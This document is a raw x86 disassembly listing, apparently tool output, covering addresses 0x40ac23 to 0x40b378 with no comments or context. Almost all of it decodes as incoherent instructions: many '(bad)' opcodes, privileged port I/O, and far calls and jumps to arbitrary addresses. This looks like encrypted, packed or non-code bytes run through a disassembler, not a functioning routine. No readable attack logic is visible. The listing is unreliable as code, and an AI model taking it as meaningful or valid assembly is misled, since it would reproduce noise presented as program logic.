  40ac23:	test   DWORD PTR [ebx-0x257ffaf4],eax
  40ac29:	mov    ebx,0xaf94cc85
  40ac2e:	mov    esi,0x8fa036de
  40ac33:	xlat   BYTE PTR ds:[ebx]
  40ac34:	pop    es
  40ac35:	mov    edi,0xe1a81186
  40ac3a:	sub    bl,BYTE PTR [ebp-0x3b4523b3]
  40ac40:	clc    
  40ac41:	pop    esp
  40ac42:	(bad)  
  40ac43:	push   cs
  40ac44:	mov    eax,0x9fb7433d
  40ac49:	fs int 0xdf
  40ac4c:	test   eax,0xd57a04ee
  40ac51:	push   ebx
  40ac52:	cdq    
  40ac53:	in     eax,0x19
  40ac55:	mov    BYTE PTR [ebx],bl
  40ac57:	xor    BYTE PTR [edi+ebp*8],bl
  40ac5a:	mov    cl,0x4
  40ac5c:	mov    ds:0x8d1b8acd,al
  40ac61:	ins    BYTE PTR es:[edi],dx
  40ac62:	adc    dl,dl
  40ac64:	gs and bh,al
  40ac67:	mov    esi,0xf3e9771f
  40ac6c:	pop    esp
  40ac6d:	scas   al,BYTE PTR es:[edi]
  40ac6e:	sbb    al,0xef
  40ac70:	xchg   esi,eax
  40ac71:	sbb    DWORD PTR ds:0x4da4054,edx
  40ac77:	les    edi,FWORD PTR [ebx]
  40ac79:	je     0x40ac4b
  40ac7b:	pusha  
  40ac7c:	dec    edi
  40ac7d:	or     DWORD PTR [ebp+eax*4-0x4f2579b9],esp
  40ac84:	inc    ebx
  40ac85:	sbb    esp,ecx
  40ac87:	add    al,0x55
  40ac89:	push   esi
  40ac8a:	xor    al,0xd8
  40ac8c:	(bad)  
  40ac8e:	mov    ds:0x309e3d7d,eax
  40ac93:	jge    0x40ac9b
  40ac95:	cmp    BYTE PTR [ecx-0xe],dh
  40ac98:	sub    ebx,DWORD PTR [edi+0x3c2ecbcf]
  40ac9e:	sub    DWORD PTR [ecx],edi
  40aca0:	or     BYTE PTR [ebx-0x5f70828b],bh
  40aca6:	add    esp,eax
  40aca8:	js     0x40ac5c
  40acaa:	jbe    0x40ace9
  40acac:	pop    edi
  40acad:	stos   DWORD PTR es:[edi],eax
  40acae:	mov    bh,0x64
  40acb0:	cwde   
  40acb1:	(bad)  
  40acb3:	inc    edx
  40acb4:	mov    ds,WORD PTR [esi+ebp*8]
  40acb7:	clc    
  40acb8:	push   ds
  40acb9:	cmp    eax,0xbb9bdbb9
  40acbe:	mov    bh,0x18
  40acc0:	fistp  QWORD PTR [edx]
  40acc2:	das    
  40acc3:	push   esi
  40acc4:	xchg   ebp,eax
  40acc5:	(bad)  
  40acc6:	cmp    esp,DWORD PTR [edx]
  40acc8:	mov    WORD PTR [edx],?
  40acca:	cli    
  40accb:	(bad)  
  40accc:	test   eax,0x6ddeb588
  40acd1:	dec    ecx
  40acd2:	or     eax,0x5abb8ce1
  40acd7:	jbe    0x40ac7c
  40acd9:	loopne 0x40acf1
  40acdb:	pop    ss
  40acdc:	mov    al,0x4b
  40acde:	fiadd  DWORD PTR [edi+eiz*1]
  40ace1:	ud2    
  40ace3:	hlt    
  40ace4:	dec    ecx
  40ace5:	mov    ebp,0x32f50da
  40acea:	or     eax,0x3455df73
  40acef:	pop    ss
  40acf0:	xchg   BYTE PTR [ecx+esi*1+0x401153db],dh
  40acf7:	mov    ecx,0xc1c91fc3
  40acfc:	test   al,0xd7
  40acfe:	xor    eax,0x362eb6a
  40ad03:	add    dl,BYTE PTR [ebp-0x46]
  40ad06:	dec    ebp
  40ad07:	retf   
  40ad08:	fninit 
  40ad0a:	jns    0x40ac8c
  40ad0c:	fild   DWORD PTR [edx+0x662df7f3]
  40ad12:	sbb    edx,ebp
  40ad14:	dec    ecx
  40ad15:	adc    DWORD PTR [ebx+0x4f55f7f8],esi
  40ad1b:	cmp    al,0xda
  40ad1d:	push   esi
  40ad1e:	xor    BYTE PTR [ebx-0x59b99b4a],0x76
  40ad25:	add    al,0xb0
  40ad27:	cmc    
  40ad28:	dec    esi
  40ad29:	xchg   edx,eax
  40ad2a:	jae    0x40ada0
  40ad2c:	outs   dx,DWORD PTR ds:[esi]
  40ad2d:	add    ebx,eax
  40ad2f:	addr16 icebp 
  40ad31:	aam    0x29
  40ad33:	lods   al,BYTE PTR ds:[esi]
  40ad34:	adc    eax,0x31934ff9
  40ad39:	(bad)  
  40ad3b:	mov    DWORD PTR [eax-0x23b1c484],ecx
  40ad41:	jle    0x40ad27
  40ad43:	aas    
  40ad44:	xchg   ecx,eax
  40ad45:	cwde   
  40ad46:	mov    WORD PTR [esi+0xb],?
  40ad49:	ins    DWORD PTR es:[edi],dx
  40ad4a:	mov    dh,0x7
  40ad4c:	cmp    eax,0xd17990a7
  40ad51:	leave  
  40ad52:	mov    eax,ds:0x8f41832e
  40ad57:	data16 jnp 0x40ad61
  40ad5a:	test   DWORD PTR [edx+edi*8],0x1ba0fc53
  40ad61:	adc    DWORD PTR [esi+0x2a],ebp
  40ad64:	add    al,bh
  40ad66:	hlt    
  40ad67:	scas   al,BYTE PTR es:[edi]
  40ad68:	les    edx,FWORD PTR [edx]
  40ad6a:	mov    cl,0xc3
  40ad6c:	int3   
  40ad6d:	inc    ax
  40ad6f:	out    0x1d,al
  40ad71:	pop    esi
  40ad72:	mov    bl,0xbf
  40ad74:	sbb    eax,0x858303d3
  40ad79:	nop
  40ad7a:	into   
  40ad7b:	jg     0x40adb6
  40ad7d:	scas   al,BYTE PTR es:[edi]
  40ad7e:	jle    0x40ad27
  40ad80:	xchg   edi,eax
  40ad81:	xchg   edi,eax
  40ad82:	bound  esp,QWORD PTR [esi-0x46adc081]
  40ad88:	fs xor ah,ah
  40ad8b:	push   cs
  40ad8c:	jbe    0x40adae
  40ad8e:	loop   0x40ad1e
  40ad90:	ss call 0xf942b6a7
  40ad96:	fcomp  DWORD PTR [ebx]
  40ad98:	and    BYTE PTR ds:0x1b99fe27,ah
  40ad9e:	mov    edi,0x376d6b6b
  40ada3:	fistp  WORD PTR [ebx-0x2a]
  40ada6:	imul   ecx,ebp,0xfc0e8767
  40adac:	dec    ebx
  40adad:	and    eax,0xbaa7f91
  40adb2:	lock clc 
  40adb4:	aam    0x37
  40adb6:	jae    0x40ad6a
  40adb8:	pop    ss
  40adb9:	(bad)  
  40adba:	fwait
  40adbb:	jp     0x40ad45
  40adbd:	pop    esi
  40adbf:	mov    edi,0xbbfa8562
  40adc4:	jg     0x40ae20
  40adc6:	xor    ebx,ebp
  40adc8:	push   eax
  40adc9:	mov    eax,ecx
  40adcb:	add    esp,DWORD PTR [esp+edi*8+0x3826211f]
  40add2:	pop    ds
  40add3:	jp     0x40ae3e
  40add5:	popf   
  40add6:	sti    
  40add7:	js     0x40ae1c
  40add9:	or     al,BYTE PTR [ebx-0x57b9f993]
  40addf:	mov    ds:0x46fa69ae,eax
  40ade4:	cmp    eax,edx
  40ade6:	arpl   WORD PTR [edx+ebx*8+0x53],dx
  40adea:	dec    ebx
  40adeb:	pop    eax
  40adec:	psadbw mm2,QWORD PTR ds:0xd9f0f28f
  40adf3:	vpandn xmm7,xmm6,XMMWORD PTR [edi+ecx*8]
  40adf8:	(bad)  
  40adf9:	lods   al,BYTE PTR ds:[esi]
  40adfa:	add    ebp,DWORD PTR [ecx-0x4e]
  40adfd:	push   ecx
  40adfe:	outs   dx,BYTE PTR ds:[esi]
  40adff:	jp     0x40ae44
  40ae01:	mov    edi,0x224a0040
  40ae06:	mov    ebx,0x88b8b37b
  40ae0b:	inc    edx
  40ae0c:	mov    ds,WORD PTR [esp+ecx*2-0x558aeae7]
  40ae13:	lea    edi,[eax+0x5e2c3a6b]
  40ae19:	ficomp DWORD PTR [ebx+0x4a104185]
  40ae1f:	xchg   BYTE PTR [ebx+0xd],dh
  40ae22:	lds    ecx,FWORD PTR [edi]
  40ae24:	dec    edi
  40ae25:	add    cl,BYTE PTR [edx]
  40ae27:	out    0x8b,eax
  40ae29:	or     eax,DWORD PTR [esi]
  40ae2b:	xor    eax,eax
  40ae2d:	ds aam 0xaf
  40ae30:	idiv   BYTE PTR ds:0x5d9d548d
  40ae36:	adc    BYTE PTR [esi-0x43415951],cl
  40ae3c:	xor    eax,0xbb58e106
  40ae41:	sbb    bh,dl
  40ae43:	cs jo  0x40ae88
  40ae46:	out    dx,al
  40ae47:	pop    edx
  40ae48:	mov    WORD PTR es:[esi-0x543481f9],ss
  40ae4f:	pop    eax
  40ae50:	and    al,0x34
  40ae52:	jl     0x40ae17
  40ae54:	sub    bh,ah
  40ae56:	scas   al,BYTE PTR es:[edi]
  40ae57:	xchg   BYTE PTR [ebx+0x3eaa5fe7],dl
  40ae5d:	je     0x40ade1
  40ae5f:	pop    ecx
  40ae60:	or     eax,0xa16750e0
  40ae65:	xchg   BYTE PTR [eax],bh
  40ae67:	mov    ch,0xe0
  40ae69:	imul   ax,WORD PTR [ebx-0xac2c8],0x3ca1
  40ae72:	mov    ecx,eax
  40ae74:	test   bl,al
  40ae76:	adc    eax,0xe928d02a
  40ae7b:	adc    bh,bl
  40ae7d:	xchg   ebp,eax
  40ae7e:	call   0xb65d:0xd5a29bc8
  40ae85:	dec    edi
  40ae86:	arpl   WORD PTR ds:0x9ad9f53d,si
  40ae8c:	cwde   
  40ae8d:	jmp    FWORD PTR [esi+0x20]
  40ae90:	aam    0xbe
  40ae92:	pop    ds
  40ae93:	es adc bl,bl
  40ae96:	mov    ebp,0x8bfbfba9
  40ae9b:	outs   dx,DWORD PTR ds:[esi]
  40ae9c:	loopne 0x40ae3f
  40ae9e:	shr    DWORD PTR [ebp+0x34],0x4
  40aea2:	adc    esp,DWORD PTR [esi+0x27aa2e64]
  40aea8:	pop    ebp
  40aea9:	int3   
  40aeaa:	test   DWORD PTR [ebx],ebp
  40aeac:	xor    edx,DWORD PTR [esi+0x35]
  40aeaf:	or     BYTE PTR [ebx],bl
  40aeb1:	jnp    0x40aec2
  40aeb3:	ins    DWORD PTR es:[edi],dx
  40aeb4:	push   cs
  40aeb5:	data16 cld 
  40aeb7:	mov    esi,0xa3cc54dc
  40aebc:	in     eax,dx
  40aebd:	sub    al,ch
  40aebf:	cmp    al,0x21
  40aec1:	pop    ds
  40aec2:	adc    BYTE PTR ss:[esp+edi*1-0x50],bl
  40aec7:	pop    esi
  40aec8:	sbb    DWORD PTR [ecx-0xc],ebx
  40aecb:	and    al,0xc3
  40aecd:	nop
  40aece:	xchg   edi,eax
  40aecf:	mov    bl,0x4c
  40aed1:	shr    DWORD PTR ss:[ebp+0x276a275d],cl
  40aed8:	stos   DWORD PTR es:[edi],eax
  40aed9:	sub    DWORD PTR [esi+ebp*2],ecx
  40aedc:	(bad)  
  40aedd:	fwait
  40aede:	inc    ebx
  40aedf:	in     eax,0xbd
  40aee1:	pop    edx
  40aee2:	in     eax,dx
  40aee3:	pushf  
  40aee4:	outs   dx,DWORD PTR ds:[esi]
  40aee5:	add    BYTE PTR [eax-0x58dfef66],al
  40aeeb:	cmp    dl,ah
  40aeed:	mov    ebp,0xdf1b409
  40aef2:	or     al,0x84
  40aef4:	call   0xeea9cf32
  40aef9:	fwait
  40aefa:	adc    eax,0x6a35c67
  40aeff:	add    cl,dh
  40af01:	pop    ecx
  40af02:	pushf  
  40af03:	out    0x4e,al
  40af05:	bound  esi,QWORD PTR [esi+ebx*2+0x2584a991]
  40af0c:	mov    ds:0x5b445a5b,eax
  40af11:	push   ss
  40af12:	hlt    
  40af13:	inc    esp
  40af14:	clc    
  40af15:	cmp    BYTE PTR [esi-0xa58124b],al
  40af1b:	jno    0x40af7b
  40af1d:	test   DWORD PTR [ecx],ecx
  40af1f:	jg     0x40af99
  40af21:	lahf   
  40af22:	ret    
  40af23:	sub    dl,BYTE PTR [edi]
  40af25:	mov    ds:0x3b2dcdfb,al
  40af2a:	push   ebx
  40af2b:	pop    ebx
  40af2c:	aaa    
  40af2d:	sti    
  40af2e:	xor    eax,0xa093b093
  40af33:	mov    ds:0x5a1cd099,eax
  40af38:	push   ecx
  40af39:	loope  0x40afa4
  40af3b:	mov    DWORD PTR [eax+0x6989c5a0],edx
  40af41:	cmc    
  40af42:	mov    ch,BYTE PTR [esi+0x2518f1bf]
  40af48:	aad    0x8d
  40af4a:	inc    eax
  40af4b:	dec    ebx
  40af4c:	push   edi
  40af4d:	stc    
  40af4e:	(bad)  
  40af4f:	or     dh,ah
  40af51:	and    eax,0x75e8653a
  40af56:	aas    
  40af57:	dec    ebx
  40af58:	sbb    ecx,ecx
  40af5a:	rcl    BYTE PTR [ecx],1
  40af5c:	je     0x40afa4
  40af5e:	push   ecx
  40af5f:	mov    ?,WORD PTR [ecx+0x552eae55]
  40af65:	inc    edx
  40af66:	test   DWORD PTR [esi+0x23ed1a6d],ecx
  40af6c:	xchg   ebx,eax
  40af6d:	xor    ecx,ecx
  40af6f:	mov    ecx,0x5f723cfe
  40af74:	and    cl,BYTE PTR [esi+edx*1-0xd63b1a7]
  40af7b:	fidiv  DWORD PTR [edx+0x72516777]
  40af81:	je     0x40af1f
  40af83:	jnp    0x40af2b
  40af85:	mov    dl,BYTE PTR [eax+0x2e8e7933]
  40af8b:	or     edx,DWORD PTR [ecx]
  40af8d:	(bad)  
  40af8e:	mov    bl,0x5c
  40af90:	push   es
  40af91:	dec    edx
  40af92:	pop    eax
  40af93:	pop    ecx
  40af94:	or     BYTE PTR [ebx],bl
  40af96:	cld    
  40af97:	gs mov dh,0x1e
  40af9a:	(bad)  [eax]
  40af9c:	fcom   DWORD PTR [edi]
  40af9e:	mov    bh,0xaa
  40afa0:	ret    0x518c
  40afa3:	hlt    
  40afa4:	sub    BYTE PTR [ebp+0x3a],bl
  40afa7:	sub    BYTE PTR [ebx+0x70c16828],ch
  40afad:	(bad)  
  40afae:	mov    dl,0x4f
  40afb0:	or     bh,BYTE PTR [eax]
  40afb2:	mov    ah,0x1f
  40afb4:	fldenv ss:[ebp-0x4e]
  40afb8:	dec    ebx
  40afb9:	push   ebx
  40afba:	pop    ds
  40afbb:	push   ds
  40afbc:	(bad)  
  40afbd:	loopne 0x40b014
  40afbf:	jbe    0x40af52
  40afc1:	push   0x2
  40afc3:	adc    eax,0x1d11bd03
  40afc8:	popa   
  40afc9:	aam    0x59
  40afcb:	stc    
  40afcc:	xlat   BYTE PTR ds:[ebx]
  40afcd:	leave  
  40afce:	sub    al,0x59
  40afd0:	lods   al,BYTE PTR ds:[esi]
  40afd1:	js     0x40b013
  40afd3:	sub    BYTE PTR [edx+0x32],al
  40afd6:	test   al,0xbd
  40afd8:	jg     0x40afa5
  40afda:	dec    ebp
  40afdb:	cdq    
  40afdc:	loopne 0x40b03f
  40afde:	in     al,dx
  40afdf:	loop   0x40b052
  40afe1:	(bad)  
  40afe2:	cmp    ebp,esi
  40afe4:	mov    ds,WORD PTR [eax]
  40afe6:	je     0x40b00f
  40afe8:	push   ds
  40afe9:	leave  
  40afea:	sbb    eax,0xcdc501b1
  40afef:	push   ebx
  40aff0:	mov    ds:0x755c2461,eax
  40aff5:	add    esp,DWORD PTR [ebx+0x14]
  40aff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aff9:	test   al,0x93
  40affb:	cmp    eax,ebp
  40affd:	and    al,0xd9
  40afff:	sub    DWORD PTR [eax-0x5a],esi
  40b002:	(bad)  
  40b003:	push   ecx
  40b004:	mov    ebx,0x49006ff1
  40b009:	jbe    0x40b07d
  40b00b:	push   ebp
  40b00c:	mov    ah,0x23
  40b00e:	inc    esp
  40b00f:	pop    ds
  40b010:	mov    edx,ebp
  40b012:	dec    ebp
  40b013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b014:	in     al,0x13
  40b016:	(bad)  
  40b017:	adc    BYTE PTR [ebp-0x52],bl
  40b01a:	fwait
  40b01b:	mov    WORD PTR [edi],ds
  40b01d:	sub    bl,BYTE PTR [edx-0x7de245d2]
  40b023:	adc    eax,0x41dd684
  40b028:	repz jp 0x40b087
  40b02b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b02c:	mov    ds:0x6fda181f,eax
  40b031:	imul   esp,DWORD PTR [eax],0x7a
  40b034:	in     eax,dx
  40b035:	aam    0x47
  40b037:	stos   DWORD PTR es:[edi],eax
  40b038:	cdq    
  40b039:	pop    esi
  40b03a:	xchg   esi,eax
  40b03b:	xor    DWORD PTR [eax+esi*4],ecx
  40b03e:	jge    0x40b0bd
  40b040:	scas   eax,DWORD PTR es:[edi]
  40b041:	loope  0x40afd0
  40b043:	fcomp  QWORD PTR [edi-0x2f]
  40b046:	xor    DWORD PTR [edi-0xbce7d20],0x57c67544
  40b050:	sub    cl,bh
  40b052:	jmp    0xe550eb3d
  40b057:	iret   
  40b058:	sub    eax,ebx
  40b05a:	ret    0xe073
  40b05d:	clc    
  40b05e:	jae    0x40b0af
  40b060:	(bad)  
  40b061:	mov    ebx,0xe8cc06d1
  40b067:	(bad)
  40b06a:	ds push ebx
  40b06c:	jl     0x40b08e
  40b06e:	mov    ds:0x7f87996e,eax
  40b073:	arpl   WORD PTR [ebp+0x7bb8dac9],cx
  40b079:	out    0xee,eax
  40b07b:	inc    edx
  40b07c:	clc    
  40b07d:	inc    eax
  40b07e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b07f:	sub    al,0xbb
  40b081:	mov    bl,0x6d
  40b083:	mov    dl,0x7c
  40b085:	or     eax,0xc3868fa8
  40b08a:	rcl    DWORD PTR [edx+0x72bbef23],cl
  40b090:	pop    edx
  40b091:	mov    eax,ds:0x2ef03e80
  40b096:	mov    esi,0x77444079
  40b09b:	mov    edx,0x59e7198e
  40b0a0:	daa    
  40b0a1:	xor    al,0x74
  40b0a3:	sub    ah,BYTE PTR [eax+0x67]
  40b0a6:	ins    DWORD PTR es:[edi],dx
  40b0a7:	aam    0x5a
  40b0a9:	adc    BYTE PTR [esi-0xa],dl
  40b0ac:	loop   0x40b11f
  40b0ae:	cmp    DWORD PTR [eax-0x6cfa74b8],edx
  40b0b4:	int    0x13
  40b0b6:	lahf   
  40b0b7:	sbb    edi,DWORD PTR [ebp+0x67039c9b]
  40b0bd:	daa    
  40b0be:	dec    eax
  40b0bf:	dec    ecx
  40b0c0:	mov    bl,0x79
  40b0c2:	cmp    al,0xd5
  40b0c4:	mov    ecx,esp
  40b0c6:	out    dx,al
  40b0c7:	mov    ch,0x9c
  40b0c9:	fimul  WORD PTR [edi+0x227bdba9]
  40b0cf:	pop    edx
  40b0d0:	mov    esp,fs
  40b0d2:	cld    
  40b0d3:	mov    ch,0xa1
  40b0d5:	dec    ebx
  40b0d6:	rcl    DWORD PTR [edx+0x4191638d],cl
  40b0dc:	aad    0x62
  40b0de:	or     cl,BYTE PTR [ebx]
  40b0e0:	outs   dx,BYTE PTR ds:[esi]
  40b0e1:	pop    edx
  40b0e2:	mov    cl,0x5e
  40b0e4:	mov    bl,al
  40b0e6:	add    edx,DWORD PTR [edi+0x60eb20b]
  40b0ec:	xchg   ebx,eax
  40b0ed:	push   ebx
  40b0ee:	sub    bl,bl
  40b0f0:	jo     0x40b0d5
  40b0f2:	sub    cl,bh
  40b0f4:	and    al,0x4a
  40b0f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0f7:	push   edx
  40b0f8:	pusha  
  40b0f9:	lods   eax,DWORD PTR ds:[esi]
  40b0fa:	not    BYTE PTR [edx+edx*1-0x37463054]
  40b101:	shr    DWORD PTR [edi],1
  40b103:	pop    edx
  40b104:	scas   al,BYTE PTR es:[edi]
  40b105:	mov    ebx,0xc76a06c8
  40b10a:	add    al,0xf0
  40b10c:	push   0x7a4314b4
  40b111:	mov    cl,0xd
  40b113:	outs   dx,BYTE PTR ds:[esi]
  40b114:	and    esp,DWORD PTR [esi+0x7aa4492e]
  40b11a:	jae    0x40b0b7
  40b11c:	jbe    0x40b125
  40b11e:	enter  0x6633,0xa7
  40b122:	mov    ch,0x95
  40b124:	ret    
  40b125:	push   ds
  40b126:	xor    BYTE PTR [eax+0x23],dh
  40b129:	loopne 0x40b13c
  40b12b:	sbb    esi,esi
  40b12d:	daa    
  40b12e:	sub    al,0xb8
  40b130:	out    0xfa,eax
  40b132:	mov    ecx,0xef2ce7bf
  40b137:	das    
  40b138:	cwde   
  40b139:	aaa    
  40b13a:	ja     0x40b0fe
  40b13c:	addr16 ret 0xd484
  40b140:	bound  ebx,QWORD PTR [ecx]
  40b142:	xchg   esi,eax
  40b143:	xchg   ecx,eax
  40b144:	adc    BYTE PTR [ecx],0xb6
  40b147:	loop   0x40b0f0
  40b149:	sub    BYTE PTR [eax+0x480ffbb8],dh
  40b14f:	mov    WORD PTR [ecx],?
  40b151:	icebp  
  40b152:	jb     0x40b18f
  40b154:	cwde   
  40b155:	repnz sti 
  40b157:	adc    edi,eax
  40b159:	jae    0x40b1c6
  40b15b:	test   BYTE PTR [ecx],bl
  40b15d:	or     esi,ebx
  40b15f:	add    al,0xb7
  40b161:	jge    0x40b1aa
  40b163:	hlt    
  40b164:	ds jbe 0x40b118
  40b167:	cmp    al,0xb7
  40b169:	dec    edi
  40b16a:	ss popf 
  40b16c:	push   ds
  40b16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b16e:	xchg   esi,eax
  40b16f:	leave  
  40b170:	and    ecx,ecx
  40b172:	fwait
  40b173:	outs   dx,DWORD PTR ds:[esi]
  40b174:	sahf   
  40b175:	mov    ss,WORD PTR [ebx-0x21]
  40b178:	sbb    DWORD PTR [esi],edx
  40b17a:	cs mov esp,DWORD PTR es:[esi+ecx*4]
  40b17f:	icebp  
  40b180:	lods   al,BYTE PTR ds:[esi]
  40b181:	stos   DWORD PTR es:[edi],eax
  40b182:	ror    DWORD PTR [edx-0x16],1
  40b185:	mov    ch,0x74
  40b187:	lods   al,BYTE PTR ds:[esi]
  40b188:	pop    ds
  40b189:	xor    eax,0xc6f82adb
  40b18e:	rcr    edi,1
  40b190:	jbe    0x40b1be
  40b192:	cdq    
  40b193:	jo     0x40b1a9
  40b195:	sbb    bl,ah
  40b197:	gs in  al,dx
  40b199:	bound  edx,QWORD PTR [ebx-0x20e0aeb9]
  40b19f:	stos   DWORD PTR es:[edi],eax
  40b1a0:	scas   al,BYTE PTR es:[edi]
  40b1a1:	cmp    DWORD PTR [eax+esi*2+0x5e],ebp
  40b1a5:	cmc    
  40b1a6:	dec    ebp
  40b1a7:	push   es
  40b1a8:	pop    es
  40b1a9:	enter  0xd1ab,0x47
  40b1ad:	or     esi,DWORD PTR [edx+0x26]
  40b1b0:	ret    0xb3ff
  40b1b3:	imul   eax,DWORD PTR [edx-0x6],0xaaf0ed4c
  40b1ba:	in     eax,0x2b
  40b1bc:	js     0x40b1c6
  40b1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bf:	das    
  40b1c0:	inc    edi
  40b1c1:	xchg   ebp,eax
  40b1c2:	fdivr  QWORD PTR [ebp+esi*8-0x337ec0b3]
  40b1c9:	stc    
  40b1ca:	jge    0x40b209
  40b1cc:	xchg   ecx,eax
  40b1cd:	dec    edi
  40b1ce:	inc    esi
  40b1cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1d0:	clc    
  40b1d1:	ret    
  40b1d2:	pop    edi
  40b1d3:	shr    BYTE PTR [edx],1
  40b1d5:	jb     0x40b22e
  40b1d7:	ins    DWORD PTR es:[edi],dx
  40b1d8:	xlat   BYTE PTR ds:[ebx]
  40b1d9:	jl     0x40b164
  40b1db:	aad    0x3e
  40b1dd:	popf   
  40b1de:	imul   ebp,DWORD PTR [edi+0x50b3cfc9],0x7
  40b1e5:	pop    ebx
  40b1e6:	loop   0x40b21b
  40b1e8:	(bad)  
  40b1e9:	fstp   st(0)
  40b1eb:	pop    ecx
  40b1ec:	aas    
  40b1ed:	hlt    
  40b1ee:	int    0x26
  40b1f0:	loop   0x40b1d1
  40b1f2:	add    BYTE PTR [ebx],al
  40b1f4:	cdq    
  40b1f5:	retf   0xdc49
  40b1f8:	test   al,0xc8
  40b1fa:	fnstenv [esi]
  40b1fc:	mov    edx,0xa95348ee
  40b201:	mov    ch,0x80
  40b203:	call   0x27fc353b
  40b208:	shr    BYTE PTR [eax],1
  40b20a:	int3   
  40b20b:	imul   esi,DWORD PTR [ebp-0x7a2f332c],0xfffffff1
  40b212:	fs lahf 
  40b214:	push   ecx
  40b215:	mov    es,ebx
  40b217:	jae    0x40b284
  40b219:	xlat   BYTE PTR ds:[ebx]
  40b21a:	stc    
  40b21b:	add    eax,0x4015d5c8
  40b220:	outs   dx,DWORD PTR ds:[esi]
  40b221:	mov    esp,0x88dfcf20
  40b226:	push   0xacb4befb
  40b22b:	push   cs
  40b22c:	or     al,ch
  40b22e:	dec    esi
  40b22f:	(bad)  
  40b230:	xchg   edi,eax
  40b231:	jmp    0x40b266
  40b233:	jmp    0x73a5:0x3d9265e6
  40b23a:	push   edi
  40b23b:	inc    esp
  40b23c:	pusha  
  40b23d:	fnstcw WORD PTR [esi]
  40b23f:	repz dec esi
  40b241:	jns    0x40b29c
  40b243:	inc    ecx
  40b244:	call   0x1afd0df5
  40b249:	xchg   edx,eax
  40b24a:	icebp  
  40b24b:	out    0x66,eax
  40b24d:	fnstsw WORD PTR [eax-0x1]
  40b250:	repnz adc bh,al
  40b253:	dec    esp
  40b254:	jno    0x40b248
  40b256:	jbe    0x40b2cc
  40b258:	loopne 0x40b1f7
  40b25a:	sub    al,BYTE PTR [edx-0x1bb9db36]
  40b260:	push   ss
  40b261:	sbb    DWORD PTR [ebx-0x2b],0x5b
  40b265:	push   ebp
  40b266:	xchg   BYTE PTR [esi],bh
  40b268:	call   0x97d4:0x74fec18
  40b26f:	jne    0x40b20a
  40b271:	outs   dx,DWORD PTR ds:[esi]
  40b272:	lods   al,BYTE PTR ds:[esi]
  40b273:	mov    ecx,0x7af1fef8
  40b278:	loope  0x40b1fe
  40b27a:	cmp    eax,0xf2b90757
  40b27f:	sub    ebp,DWORD PTR [eiz*2+0x6030990b]
  40b286:	ja     0x40b24d
  40b288:	scas   al,BYTE PTR es:[edi]
  40b289:	in     al,dx
  40b28a:	ds mov eax,0x947c1c89
  40b290:	sub    esp,edx
  40b292:	push   ebp
  40b293:	push   ebx
  40b294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b295:	in     eax,0xd
  40b297:	xchg   ebx,eax
  40b298:	mov    BYTE PTR [edx],al
  40b29a:	loope  0x40b248
  40b29c:	add    al,0x7f
  40b29e:	xchg   ebx,eax
  40b29f:	es jg  0x40b2c7
  40b2a2:	leave  
  40b2a3:	push   esp
  40b2a4:	hlt    
  40b2a5:	sar    edi,0x9c
  40b2a8:	iret   
  40b2a9:	xor    ebp,ecx
  40b2ab:	mov    ss,esi
  40b2ad:	mov    esp,0x37caadef
  40b2b2:	or     cl,cl
  40b2b4:	and    al,0x57
  40b2b6:	xor    eax,0xc831f9bb
  40b2bb:	fwait
  40b2bc:	cmp    dl,ah
  40b2be:	in     eax,0x42
  40b2c0:	xor    eax,0x9d83fdd6
  40b2c5:	dec    edi
  40b2c6:	das    
  40b2c7:	loop   0x40b2d6
  40b2c9:	cmp    esi,DWORD PTR [ebx+0x61]
  40b2cc:	and    bl,BYTE PTR [ebx-0x6d5e4a23]
  40b2d2:	dec    esi
  40b2d3:	xchg   DWORD PTR [edx+0x323a716d],edx
  40b2d9:	adc    al,0xf5
  40b2db:	daa    
  40b2dc:	dec    ecx
  40b2dd:	loopne 0x40b2c1
  40b2df:	mov    WORD PTR [edx-0x2d82e1ca],ss
  40b2e5:	(bad)  
  40b2e6:	cwde   
  40b2e7:	mov    bh,0xca
  40b2e9:	int3   
  40b2ea:	jae    0x40b285
  40b2ec:	sbb    eax,0xde35dffe
  40b2f1:	xchg   ebp,eax
  40b2f2:	mov    cl,0x8d
  40b2f4:	pop    ebx
  40b2f5:	popa   
  40b2f6:	aam    0x20
  40b2f8:	mov    esp,0xb5bc809b
  40b2fd:	jmp    0x414f8842
  40b302:	mov    dl,0x17
  40b304:	push   ss
  40b305:	bound  ebx,QWORD PTR [esi-0x52]
  40b308:	add    eax,0xea019ad2
  40b30d:	add    ecx,DWORD PTR [edx+0x793b4cbe]
  40b313:	jl     0x40b35d
  40b315:	fwait
  40b316:	setl   BYTE PTR [ebp+0x38577050]
  40b31d:	aaa    
  40b31e:	cmp    eax,0x7c788f68
  40b323:	mov    ebp,0x660649e2
  40b328:	iret   
  40b329:	fdivr  QWORD PTR [eax]
  40b32b:	cwde   
  40b32c:	div    BYTE PTR [edi]
  40b32e:	pop    esi
  40b32f:	mov    esp,0x71f47c26
  40b334:	es je  0x40b315
  40b337:	add    esp,DWORD PTR [ebp-0x62]
  40b33a:	mov    eax,ds:0x124ab4fd
  40b33f:	outs   dx,DWORD PTR ds:[esi]
  40b340:	call   0x9ee9dd7f
  40b345:	dec    edi
  40b346:	in     al,0x84
  40b348:	cdq    
  40b349:	push   esi
  40b34a:	add    dl,bh
  40b34c:	or     bl,BYTE PTR [esi]
  40b34e:	cmp    ch,dh
  40b350:	pop    edi
  40b351:	stc    
  40b352:	scas   al,BYTE PTR es:[edi]
  40b353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b354:	shl    BYTE PTR [edx+0x17],0xfe
  40b358:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b359:	in     al,dx
  40b35a:	xor    eax,0x6fbe14d9
  40b35f:	(bad)  
  40b360:	cmp    eax,0x6183fa0e
  40b365:	fistp  DWORD PTR [ecx-0x4df10609]
  40b36b:	call   0x583b2e7
  40b370:	push   edi
  40b371:	outs   dx,BYTE PTR ds:[si]
  40b373:	lock fcmovb st,st(7)
  40b376:	sar    DWORD PTR [esi],cl
  40b378:	dec    ebx
